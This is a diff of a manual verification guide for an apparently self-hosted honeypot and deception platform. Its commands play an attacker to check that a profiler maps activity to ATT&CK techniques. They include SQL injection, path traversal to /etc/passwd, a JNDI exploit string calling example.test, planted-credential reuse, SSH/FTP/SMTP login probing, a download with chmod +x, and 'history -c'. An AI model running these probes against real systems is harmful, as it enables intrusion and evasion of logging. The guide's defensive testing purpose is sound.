@@ -2,14 +2,14 @@
 
 This guide is only for live/manual verification on the VM at `146.169.44.23`. Use host-facing browser or terminal traffic; avoid `docker run --network ...` for attacker traffic because it creates Docker bridge source IPs.
 
+This file is intentionally command-heavy; design details are in `ARCHITECTURE.md`, and offline metrics are in `EVALUATION.md`.
+
 ## 1. Start
 
 ```bash
-# Clear previous bindings, routes, observations, and runtime containers.
-./scripts/reset_enterprise_runtime.sh
+./scripts/reset_enterprise_runtime.sh # Clear previous bindings, routes, observations, and runtime containers.
 
-# Start the public portal, controller/orchestrator services, dashboard, forwarders, and enterprise compose slice.
-./scripts/start_enterprise_stack.sh
+./scripts/start_enterprise_stack.sh # Start the public portal, controller/orchestrator services, dashboard, forwarders, and enterprise compose slice.
 ```
 
 Optional local tunnel for browser testing:
@@ -78,108 +78,75 @@ TEST_ATTACKER_KEY="$(
 HTTP content variants:
 
 ```bash
-# Apply the portal service-directory configuration for this attacker binding.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh internal-portal portal-api-directory-links
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh internal-portal portal-api-directory-links # Apply the portal service-directory configuration for this attacker binding.
 
-# tests T1046/T1018: service/API directory access.
-curl -fsS "http://146.169.44.23:18080/api/openapi-summary.json" | grep -F "Operations Directory API"
+curl -fsS "http://146.169.44.23:18080/api/openapi-summary.json" | grep -F "Operations Directory API" # tests T1046/T1018: service/API directory access.
 
-# tests T1046/T1018: runbook-host inventory interest.
-curl -fsS "http://146.169.44.23:18080/runbooks/service-directory.md" | grep -F "service-directory"
+curl -fsS "http://146.169.44.23:18080/runbooks/service-directory.md" | grep -F "service-directory" # tests T1046/T1018: runbook-host inventory interest.
 
-# Apply the portal admin-link configuration for this attacker binding.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh internal-portal portal-admin-console-link
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh internal-portal portal-admin-console-link # Apply the portal admin-link configuration for this attacker binding.
 
-# tests T1213: reading the per-binding admin-console runbook.
-curl -fsS "http://146.169.44.23:18080/runbooks/admin-console-access.md" | grep -F "Maintenance Access"
+curl -fsS "http://146.169.44.23:18080/runbooks/admin-console-access.md" | grep -F "Maintenance Access" # tests T1213: reading the per-binding admin-console runbook.
 
-# Apply the finance archive-index configuration.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh finance-share finance-backup-archive-index
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh finance-share finance-backup-archive-index # Apply the finance archive-index configuration.
 
-# tests T1005: finance archive index access.
-curl -fsS "http://146.169.44.23:18082/finance/archive/2024/customer-export-index.csv" | grep -F "customer-export"
+curl -fsS "http://146.169.44.23:18082/finance/archive/2024/customer-export-index.csv" | grep -F "customer-export" # tests T1005: finance archive index access.
 
-# tests T1005: finance archive manifest access.
-curl -fsS "http://146.169.44.23:18082/finance/archive/2024/archive-manifest.txt" | grep -F "Finance archive manifest"
+curl -fsS "http://146.169.44.23:18082/finance/archive/2024/archive-manifest.txt" | grep -F "Finance archive manifest" # tests T1005: finance archive manifest access.
 
-# Apply the finance password-rotation note configuration.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh finance-share finance-password-rotation-clue
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh finance-share finance-password-rotation-clue # Apply the finance password-rotation note configuration.
 
-# tests T1213: reading a credential-process note; actual credential reuse is tested by follow-up login probes.
-curl -fsS "http://146.169.44.23:18082/finance/archive/2024/password-rotation-note.txt" | grep -F "password rotation"
+curl -fsS "http://146.169.44.23:18082/finance/archive/2024/password-rotation-note.txt" | grep -F "password rotation" # tests T1213: reading a credential-process note; actual credential reuse is tested by follow-up login probes.
 
-# Apply the web-admin login-surface configuration.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh web-admin-console web-admin-login-surface
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh web-admin-console web-admin-login-surface # Apply the web-admin login-surface configuration.
 
-# visibility only: page load confirms the login page exists; the POST below tests T1110.
-curl -fsS "http://146.169.44.23:18081/login/" | grep -F "Northbridge Admin Console"
+curl -fsS "http://146.169.44.23:18081/login/" | grep -F "Northbridge Admin Console" # visibility only: page load confirms the login page exists; the POST below tests T1110.
 
-# tests T1110: failed admin-console login attempt.
-curl -fsS -X POST "http://146.169.44.23:18081/login" -d "username=admin&password=x" >/dev/null || true
+curl -fsS -X POST "http://146.169.44.23:18081/login" -d "username=admin&password=x" >/dev/null || true # tests T1110: failed admin-console login attempt.
 
-# Apply the web-admin discovery endpoint configuration.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh web-admin-console web-admin-discovery-endpoints
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh web-admin-console web-admin-discovery-endpoints # Apply the web-admin discovery endpoint configuration.
 
-# tests T1518: software/inventory discovery.
-curl -fsS "http://146.169.44.23:18081/api/inventory.json" | grep -F "svc-admin-console"
+curl -fsS "http://146.169.44.23:18081/api/inventory.json" | grep -F "svc-admin-console" # tests T1518: software/inventory discovery.
 
-# tests T1057: process discovery.
-curl -fsS "http://146.169.44.23:18081/api/processes.json" | grep -F "admin-console"
+curl -fsS "http://146.169.44.23:18081/api/processes.json" | grep -F "admin-console" # tests T1057: process discovery.
 
-# tests T1069: permission-group discovery.
-curl -fsS "http://146.169.44.23:18081/api/groups.json" | grep -F "platform"
+curl -fsS "http://146.169.44.23:18081/api/groups.json" | grep -F "platform" # tests T1069: permission-group discovery.
 
-# tests T1082: system/container resource discovery.
-curl -fsS "http://146.169.44.23:18081/api/container-resources.json" | grep -F "ops-prod-a"
+curl -fsS "http://146.169.44.23:18081/api/container-resources.json" | grep -F "ops-prod-a" # tests T1082: system/container resource discovery.
 
-# Apply the VPN profile/login-clue configuration.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh vpn-appliance vpn-profile-login-clue
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh vpn-appliance vpn-profile-login-clue # Apply the VPN profile/login-clue configuration.
 
-# tests T1133: external remote-service profile clue.
-curl -fsS "http://146.169.44.23:18443/policy/login-clue.txt" | grep -F "Remote access profile"
+curl -fsS "http://146.169.44.23:18443/policy/login-clue.txt" | grep -F "Remote access profile" # tests T1133: external remote-service profile clue.
 
-# tests T1133: contractor VPN profile download.
-curl -fsS "http://146.169.44.23:18443/download/contractor-profile.ovpn" | grep -F "auth-user-pass"
+curl -fsS "http://146.169.44.23:18443/download/contractor-profile.ovpn" | grep -F "auth-user-pass" # tests T1133: contractor VPN profile download.
 
-# Apply the VPN route-policy note configuration.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh vpn-appliance vpn-route-policy-notes
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh vpn-appliance vpn-route-policy-notes # Apply the VPN route-policy note configuration.
 
-# tests T1016: route-policy note access.
-curl -fsS "http://146.169.44.23:18443/policy/route-policy-notes.txt" | grep -F "Split-tunnel"
+curl -fsS "http://146.169.44.23:18443/policy/route-policy-notes.txt" | grep -F "Split-tunnel" # tests T1016: route-policy note access.
 
-# tests T1572: tunnel route list access.
-curl -fsS "http://146.169.44.23:18443/policy/tunnel-routes.txt" | grep -F "Split tunnel"
+curl -fsS "http://146.169.44.23:18443/policy/tunnel-routes.txt" | grep -F "Split tunnel" # tests T1572: tunnel route list access.
 
-# Apply the malware-sink downloader staging configuration.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-downloader-staging-directory
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-downloader-staging-directory # Apply the malware-sink downloader staging configuration.
 
-# tests T1608: downloader/resource staging index access.
-curl -fsS "http://146.169.44.23:18085/staging/downloader-index.txt" | grep -F "endpoint package"
+curl -fsS "http://146.169.44.23:18085/staging/downloader-index.txt" | grep -F "endpoint package" # tests T1608: downloader/resource staging index access.
 
-# tests T1105: staged downloader binary request.
-curl -fsS "http://146.169.44.23:18085/downloads/agent-update.bin" >/dev/null
+curl -fsS "http://146.169.44.23:18085/downloads/agent-update.bin" >/dev/null # tests T1105: staged downloader binary request.
 
-# Apply the malware-sink upload/drop endpoint configuration.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-upload-drop-endpoint
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-upload-drop-endpoint # Apply the malware-sink upload/drop endpoint configuration.
 
-# visibility only: drop-endpoint note read; the POST below tests T1567.
-curl -fsS "http://146.169.44.23:18085/upload/drop-endpoint.txt" | grep -F "Upload intake endpoint"
+curl -fsS "http://146.169.44.23:18085/upload/drop-endpoint.txt" | grep -F "Upload intake endpoint" # visibility only: drop-endpoint note read; the POST below tests T1567.
 
-# tests T1567: upload/exfil-shaped POST to the exposed drop endpoint.
-curl -fsS -X POST "http://146.169.44.23:18085/upload/" -d "filename=finance-drop.zip" >/dev/null || true
+curl -fsS -X POST "http://146.169.44.23:18085/upload/" -d "filename=finance-drop.zip" >/dev/null || true # tests T1567: upload/exfil-shaped POST to the exposed drop endpoint.
 ```
 
 Protocol target-runtime variants:
 
 ```bash
-# Swap Git from base canary to the seeded Git daemon.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh git-internal git-seeded-repository-backend
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh git-internal git-seeded-repository-backend # Swap Git from base canary to the seeded Git daemon.
 
-# tests T1046/T1213: Git service and repository access.
-timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git | head
+timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git | head # tests T1046/T1213: Git service and repository access.
 
-# Swap Redis to the seeded keyspace backend.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh redis-cache redis-seeded-keyspace-backend
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh redis-cache redis-seeded-keyspace-backend # Swap Redis to the seeded keyspace backend.
 
 # tests T1046/T1213: Redis keyspace discovery.
 printf "KEYS *\r\n" | nc -w 3 146.169.44.23 16379 | grep -F "session:portal.reader"
@@ -187,8 +154,7 @@ printf "KEYS *\r\n" | nc -w 3 146.169.44.23 16379 | grep -F "session:portal.read
 # tests T1046/T1005: Redis seeded value read.
 printf "GET session:portal.reader\r\n" | nc -w 3 146.169.44.23 16379 | grep -F "nbp_reader"
 
-# Swap FTP to the configured archive banner backend.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ftp-archive ftp-archive-review-banner
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ftp-archive ftp-archive-review-banner # Swap FTP to the configured archive banner backend.
 
 # tests T1110/T1021: FTP USER probe; banner visibility is checked by grep.
 printf "USER archive\r\n" | nc -w 3 146.169.44.23 12121 | grep -F "archive-ftpd.internal.local"
@@ -196,8 +162,7 @@ printf "USER archive\r\n" | nc -w 3 146.169.44.23 12121 | grep -F "archive-ftpd.
 # tests T1110/T1021/T1039: FTP login and archive retrieval attempt.
 printf "USER anonymous\r\nPASS anonymous\r\nRETR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 146.169.44.23 12121 || true
 
-# Swap ops-db to the configured MySQL-compatible banner backend.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ops-db ops-db-schema-banner-backend
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ops-db ops-db-schema-banner-backend # Swap ops-db to the configured MySQL-compatible banner backend.
 
 # visibility check: MySQL handshake is visible without using the Docker bridge.
 python3 - <<'PY'
@@ -222,23 +187,19 @@ with socket.create_connection(("146.169.44.23", 13306), timeout=5) as sock:
     print(sock.recv(4096).decode("utf-8", errors="replace"))
 PY
 
-# Swap the SSH canary to Cowrie.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ssh-canary ssh-cowrie-jumpbox-profile
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ssh-canary ssh-cowrie-jumpbox-profile # Swap the SSH canary to Cowrie.
 
-# visibility check: route accepts a client connection; failure is expected because BatchMode avoids password entry.
-ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true
+ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true # visibility check: route accepts a client connection; failure is expected because BatchMode avoids password entry.
 
 # tests T1021.004/T1110: one SSH password attempt.
 tmpask="$(mktemp)"; printf '#!/bin/sh\necho wrongpass\n' > "$tmpask"; chmod +x "$tmpask"; DISPLAY=:0 SSH_ASKPASS="$tmpask" SSH_ASKPASS_REQUIRE=force setsid ssh -o NumberOfPasswordPrompts=1 -o PubkeyAuthentication=no -o PreferredAuthentications=password -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true; rm -f "$tmpask"
 
-# Swap Telnet to the legacy console prompt backend.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh legacy-telnet legacy-telnet-console-prompt
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh legacy-telnet legacy-telnet-console-prompt # Swap Telnet to the legacy console prompt backend.
 
 # tests T1021/T1110: configured legacy console login-path probe.
 printf "admin\r\n" | nc -w 3 146.169.44.23 12323 | grep -F "Northbridge legacy console"
 
-# Swap SMTP to Mailoney.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh mail-relay mailoney-auth-relay-backend
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh mail-relay mailoney-auth-relay-backend # Swap SMTP to Mailoney.
 
 # tests T1046: SMTP banner/relay interaction.
 printf "EHLO tester\r\nQUIT\r\n" | nc -w 3 146.169.44.23 2525 | grep -F "Python SMTP proxy"
@@ -246,39 +207,31 @@ printf "EHLO tester\r\nQUIT\r\n" | nc -w 3 146.169.44.23 2525 | grep -F "Python 
 # tests T1087.003/T1110: SMTP recipient probing and AUTH attempt.
 printf "EHLO tester\r\nVRFY finance\r\nAUTH LOGIN\r\nYWRtaW4=\r\nV3JvbmdQYXNz\r\nQUIT\r\n" | nc -w 4 146.169.44.23 2525 || true
 
-# Swap the admin jumpbox to its Cowrie operator profile.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh admin-jumpbox jumpbox-cowrie-operator-profile
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh admin-jumpbox jumpbox-cowrie-operator-profile # Swap the admin jumpbox to its Cowrie operator profile.
 
-# visibility check: jumpbox SSH route accepts a client connection.
-ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 10222 root@146.169.44.23 true </dev/null || true
+ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 10222 root@146.169.44.23 true </dev/null || true # visibility check: jumpbox SSH route accepts a client connection.
 ```
 
 High-interaction target variants:
 
 ```bash
-# Apply the Dionaea-to-Glutton adjacent HTTP capture route.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh dionaea-capture dionaea-to-glutton-http-capture
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh dionaea-capture dionaea-to-glutton-http-capture # Apply the Dionaea-to-Glutton adjacent HTTP capture route.
 
 # tests T1190/T1105 through generic high-interaction capture. This probe may not return an HTTP page; the expected effect is capture telemetry.
 printf "GET /config-check HTTP/1.1\r\nHost: capture.local\r\n\r\n" | nc -w 3 146.169.44.23 19999 || true
 
-# Apply the malware-sink same-port Dionaea upgrade.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-dionaea-same-port-upgrade
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-dionaea-same-port-upgrade # Apply the malware-sink same-port Dionaea upgrade.
 
-# tests T1041/T1105/T1190/T1204.002 when latest 18085 route points to Dionaea.
-curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" | head
+curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" | head # tests T1041/T1105/T1190/T1204.002 when latest 18085 route points to Dionaea.
 
-# Apply the malware-sink adjacent generic capture listener.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-honeytrap-generic-listener
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-honeytrap-generic-listener # Apply the malware-sink adjacent generic capture listener.
 
 # tests T1046/T1105/T1190 through generic TCP capture.
 printf "payload upload test\r\n" | nc -w 3 146.169.44.23 19999 || true
 
-# Swap generic capture to Wordpot.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh honeytrap-generic honeytrap-wordpot-web-capture
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh honeytrap-generic honeytrap-wordpot-web-capture # Swap generic capture to Wordpot.
 
-# tests T1190/T1046: WordPress-like exploit/probe surface.
-curl -i "http://146.169.44.23:19999/wp-login.php" | grep -F "Wordpress"
+curl -i "http://146.169.44.23:19999/wp-login.php" | grep -F "Wordpress" # tests T1190/T1046: WordPress-like exploit/probe surface.
 ```
 
 Expected: each `apply_configuration_variant_for_test.sh` response shows a route update and either `configured_runtime: true` for same-port swaps or a newly exposed target asset. Each probe returns the expected visible string or successful protocol handshake within a reconnect.
@@ -288,50 +241,35 @@ Expected: each `apply_configuration_variant_for_test.sh` response shows a route 
 Run this from the same terminal/browser source IP that will later test internal ports:
 
 ```bash
-# Baseline page load; verifies public portal access logging.
-curl -i "http://146.169.44.23:8080/"
+curl -i "http://146.169.44.23:8080/" # Baseline page load; verifies public portal access logging.
 
-# Public credential/config breadcrumb; should trigger credential/config discovery evidence.
-curl -i "http://146.169.44.23:8080/.env.old"
+curl -i "http://146.169.44.23:8080/.env.old" # Public credential/config breadcrumb; should trigger credential/config discovery evidence.
 
-# Public password-file breadcrumb; should strengthen credential-access evidence.
-curl -i "http://146.169.44.23:8080/backup/passwords_internal.txt"
+curl -i "http://146.169.44.23:8080/backup/passwords_internal.txt" # Public password-file breadcrumb; should strengthen credential-access evidence.
 
-# Public backup breadcrumb; should trigger backup/archive discovery evidence.
-curl -i "http://146.169.44.23:8080/backup/db_backup_2024.sql.bak"
+curl -i "http://146.169.44.23:8080/backup/db_backup_2024.sql.bak" # Public backup breadcrumb; should trigger backup/archive discovery evidence.
 
-# Source-map breadcrumb; should support developer/Git-path reveal decisions.
-curl -i "http://146.169.44.23:8080/assets/app.js.map"
+curl -i "http://146.169.44.23:8080/assets/app.js.map" # Source-map breadcrumb; should support developer/Git-path reveal decisions.
 
-# Admin path probe; should support admin-console reveal decisions.
-curl -i "http://146.169.44.23:8080/admin"
+curl -i "http://146.169.44.23:8080/admin" # Admin path probe; should support admin-console reveal decisions.
 
-# Exposed Git config probe; should support Git/developer surface interest.
-curl -i "http://146.169.44.23:8080/.git/config"
+curl -i "http://146.169.44.23:8080/.git/config" # Exposed Git config probe; should support Git/developer surface interest.
 
-# PHP info probe; scanner/discovery signal.
-curl -i "http://146.169.44.23:8080/phpinfo.php"
+curl -i "http://146.169.44.23:8080/phpinfo.php" # PHP info probe; scanner/discovery signal.
 
-# Failed login attempt; should map to credential/login probing evidence.
-curl -i -X POST "http://146.169.44.23:8080/login" -d "username=admin&password=WrongPassword"
+curl -i -X POST "http://146.169.44.23:8080/login" -d "username=admin&password=WrongPassword" # Failed login attempt; should map to credential/login probing evidence.
 
-# SQL injection scanner probe; should map to exploit/scanner evidence.
-curl -i -A "sqlmap/1.8 live-test" "http://146.169.44.23:8080/api/search?q=1%20union%20select%201"
+curl -i -A "sqlmap/1.8 live-test" "http://146.169.44.23:8080/api/search?q=1%20union%20select%201" # SQL injection scanner probe; should map to exploit/scanner evidence.
 
-# Internal API breadcrumb from the public surface; supports portal/admin dependency markers.
-curl -i "http://146.169.44.23:8080/internal-api/status"
+curl -i "http://146.169.44.23:8080/internal-api/status" # Internal API breadcrumb from the public surface; supports portal/admin dependency markers.
 
-# Local file inclusion/path traversal probe.
-curl -i "http://146.169.44.23:8080/view?file=../../../../etc/passwd"
+curl -i "http://146.169.44.23:8080/view?file=../../../../etc/passwd" # Local file inclusion/path traversal probe.
 
-# JNDI-style exploit probe.
-curl -i "http://146.169.44.23:8080/lookup?x=%24%7Bjndi%3Aldap%3A%2F%2Fexample.test%2Fa%7D"
+curl -i "http://146.169.44.23:8080/lookup?x=%24%7Bjndi%3Aldap%3A%2F%2Fexample.test%2Fa%7D" # JNDI-style exploit probe.
 
-# Give forwarders and the profiler a moment to ingest observations.
-sleep 2
+sleep 2 # Give forwarders and the profiler a moment to ingest observations.
 
-# Confirm public observations became profiler evidence and updated the attacker profile.
-curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_entrypoint_observations: [.recent_entrypoint_observations[] | {attacker_key, path, matched_rules, indicators, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, public_http_evidence, unlocked_assets}]}'
+curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_entrypoint_observations: [.recent_entrypoint_observations[] | {attacker_key, path, matched_rules, indicators, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, public_http_evidence, unlocked_assets}]}' # Confirm public observations became profiler evidence and updated the attacker profile.
 ```
 
 Expected: suspicious public paths have `matched_rules`, non-empty `profiler_evidence_ids`, and the attacker profile shows HTTP evidence.
@@ -341,36 +279,27 @@ Expected: suspicious public paths have `matched_rules`, non-empty `profiler_evid
 Connect to Cowrie:
 
 ```bash
-# Open an interactive Cowrie SSH session through the public SSH honeypot port.
-ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@146.169.44.23
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@146.169.44.23 # Open an interactive Cowrie SSH session through the public SSH honeypot port.
 ```
 
 Type these inside Cowrie:
 
 ```bash
-# User discovery.
-whoami
+whoami # User discovery.
 
-# User/group discovery.
-id
+id # User/group discovery.
 
-# Host/system discovery.
-uname -a
+uname -a # Host/system discovery.
 
-# Account-file discovery.
-cat /etc/passwd
+cat /etc/passwd # Account-file discovery.
 
-# Tool transfer attempt against the malware sink route.
-curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin
+curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin # Tool transfer attempt against the malware sink route.
 
-# Permission change on downloaded tool.
-chmod +x /tmp/agent-update.bin
+chmod +x /tmp/agent-update.bin # Permission change on downloaded tool.
 
-# Indicator removal.
-history -c
+history -c # Indicator removal.
 
-# End the Cowrie session.
-exit
+exit # End the Cowrie session.
 ```
 
 Expected minimum mappings:
@@ -386,11 +315,9 @@ Expected minimum mappings:
 | `history -c` | `T1070.003` |
 
 ```bash
-# Wait for Cowrie forwarder and profiler ingestion.
-sleep 2
+sleep 2 # Wait for Cowrie forwarder and profiler ingestion.
 
-# Confirm Cowrie observations and mapped techniques reached the dashboard/profile.
-curl -s "http://146.169.44.23:8090/api/summary" | jq '{cowrie: [.recent_cowrie_observations[] | {eventid, attacker_key, command, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, commands, recent_tactics, recent_techniques, unlocked_assets}]}'
+curl -s "http://146.169.44.23:8090/api/summary" | jq '{cowrie: [.recent_cowrie_observations[] | {eventid, attacker_key, command, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, commands, recent_tactics, recent_techniques, unlocked_assets}]}' # Confirm Cowrie observations and mapped techniques reached the dashboard/profile.
 ```
 
 ## 4. Unlock Fixed-Port MVP Assets
@@ -404,17 +331,13 @@ TEST_ATTACKER_KEY="$(
     jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
 )"
 
-# Print the chosen attacker key for sanity.
-echo "$TEST_ATTACKER_KEY"
+echo "$TEST_ATTACKER_KEY" # Print the chosen attacker key for sanity.
 
-# Force-unlock the standard fixed-port internal assets for this attacker.
-ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh
+ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh # Force-unlock the standard fixed-port internal assets for this attacker.
 
-# Wait for orchestrator route writes and backend startup.
-sleep 3
+sleep 3 # Wait for orchestrator route writes and backend startup.
 
-# Verify routes exist for this exact attacker key.
-jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip) | .asset_id] | unique' data/runtime/asset_gateway_routes.json
+jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip) | .asset_id] | unique' data/runtime/asset_gateway_routes.json # Verify routes exist for this exact attacker key.
 ```
 
 Expected: the route list includes `internal-portal`, `finance-share`, `git-internal`, `ops-db`, `redis-cache`, `web-admin-console`, `ftp-archive`, `ssh-canary`, `legacy-telnet`, `mail-relay`, `vpn-appliance`, and `malware-sink`. Extra naturally unlocked assets may also appear if the adaptive loop already acted.
@@ -425,57 +348,40 @@ Run this from the same source IP used above:
 
 ```bash
 # static HTTP assets
-# Internal portal landing page; proves the portal route is open.
-curl -i "http://146.169.44.23:18080/" || true
+curl -i "http://146.169.44.23:18080/" || true # Internal portal landing page; proves the portal route is open.
 
-# Invalid internal-portal credential reuse; should produce failed login evidence.
-curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=WrongToken" || true
+curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=WrongToken" || true # Invalid internal-portal credential reuse; should produce failed login evidence.
 
-# Valid internal-portal credential reuse; should produce valid-token evidence.
-curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=nbp_reader_2026_04_window" || true
+curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=nbp_reader_2026_04_window" || true # Valid internal-portal credential reuse; should produce valid-token evidence.
 
-# Web admin landing page.
-curl -i "http://146.169.44.23:18081/" || true
+curl -i "http://146.169.44.23:18081/" || true # Web admin landing page.
 
-# Web admin status endpoint discovery.
-curl -i "http://146.169.44.23:18081/api/status" || true
+curl -i "http://146.169.44.23:18081/api/status" || true # Web admin status endpoint discovery.
 
-# Finance share landing page.
-curl -i "http://146.169.44.23:18082/" || true
+curl -i "http://146.169.44.23:18082/" || true # Finance share landing page.
 
-# Finance archive file access.
-curl -i "http://146.169.44.23:18082/finance/archive/2024/budget-q4-review.xlsx" || true
+curl -i "http://146.169.44.23:18082/finance/archive/2024/budget-q4-review.xlsx" || true # Finance archive file access.
 
-# Finance staged archive access.
-curl -i "http://146.169.44.23:18082/finance/archive/2024/payroll-archive.zip" || true
+curl -i "http://146.169.44.23:18082/finance/archive/2024/payroll-archive.zip" || true # Finance staged archive access.
 
-# Finance backup file access.
-curl -i "http://146.169.44.23:18082/exports/db_backup_2024.sql.bak" || true
+curl -i "http://146.169.44.23:18082/exports/db_backup_2024.sql.bak" || true # Finance backup file access.
 
-# VPN landing page.
-curl -i "http://146.169.44.23:18443/" || true
+curl -i "http://146.169.44.23:18443/" || true # VPN landing page.
 
-# VPN backup request without credentials.
-curl -i "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true
+curl -i "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true # VPN backup request without credentials.
 
-# VPN backup request with planted contractor credential.
-curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true
+curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true # VPN backup request with planted contractor credential.
 
-# VPN profile download with planted contractor credential.
-curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/download/contractor-profile.ovpn" || true
+curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/download/contractor-profile.ovpn" || true # VPN profile download with planted contractor credential.
 
-# Malware sink landing page.
-curl -i "http://146.169.44.23:18085/" || true
+curl -i "http://146.169.44.23:18085/" || true # Malware sink landing page.
 
